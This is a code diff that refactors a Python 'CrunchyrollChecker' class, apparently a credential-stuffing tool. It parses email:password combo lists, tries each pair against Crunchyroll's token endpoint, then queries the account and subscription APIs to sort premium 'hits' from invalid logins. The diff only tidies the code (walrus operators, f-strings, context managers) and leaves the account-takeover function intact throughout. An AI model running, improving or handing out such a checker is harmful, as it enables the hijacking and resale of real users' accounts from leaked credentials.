@@ -36,14 +36,10 @@ class CrunchyrollChecker:
         self._checker()
 
     def _checker(self):
-        file = open(self.filename)
-        for line in file.readlines():
-            loginDetail = self._filterEmailPass(line)
-            if loginDetail:
-                self._tryToLogin()
-            else:
-                continue
-        file.close()
+        with open(self.filename) as file:
+            for line in file:
+                if loginDetail := self._filterEmailPass(line):
+                    self._tryToLogin()
         self.hitFile.close()
         self.invalid.close()
     
@@ -55,12 +51,7 @@ class CrunchyrollChecker:
         ):
         if data:
             data = parse.urlencode(data).encode()
-        req = request.Request(
-            url,
-            headers = headers,
-            data = data
-        )
-        return req
+        return request.Request(url, headers=headers, data=data)
 
     def _parseResponse(self, res):
         res = res.read()
@@ -75,11 +66,7 @@ class CrunchyrollChecker:
         headers = dict(self.headers)
         headers["authorization"] = self.auth
         headers["Content-Type"] = "application/x-www-form-urlencoded"
-        req = self._makeRequest(
-            self.apiUrl + "auth/v1/token",
-            headers,
-            data
-        )
+        req = self._makeRequest(f"{self.apiUrl}auth/v1/token", headers, data)
         try:
             res = request.urlopen(req)
         except error.HTTPError as e:
@@ -112,8 +99,7 @@ class CrunchyrollChecker:
                     self._resultSaving(error = f'Acces Token is empty {Fore.CYAN}{resData}')
     
     def _filterEmailPass(self, line):
-        loginDetail = re.findall(regexEmailPassCombo, line)
-        if loginDetail:
+        if loginDetail := re.findall(regexEmailPassCombo, line):
             self.email, self.password = loginDetail[0].split(':')
             return True
         else:
@@ -162,16 +148,12 @@ class CrunchyrollChecker:
     def _premiumChecker(self, accessToken):
         header = dict(self.headers)
         header["authorization"] = f"Bearer {accessToken}"
-        externalID = self._getExternalID(header)
-        if externalID:
+        if externalID := self._getExternalID(header):
             self._subscriptionChecker(header, externalID)
         return
 
     def _getExternalID(self, header):
-        req = self._makeRequest(
-            self.apiUrl + 'accounts/v1/me',
-            headers = header
-        )
+        req = self._makeRequest(f'{self.apiUrl}accounts/v1/me', headers = header)
         try:
             res = request.urlopen(req)
         except error.HTTPError as e:
@@ -192,8 +174,8 @@ class CrunchyrollChecker:
 
     def _subscriptionChecker(self, header, externalID):
         req = self._makeRequest(
-            self.apiUrl + f'subs/v1/subscriptions/{externalID}/products',
-            headers = header
+            f'{self.apiUrl}subs/v1/subscriptions/{externalID}/products',
+            headers=header,
         )
         try:
             res = request.urlopen(req)
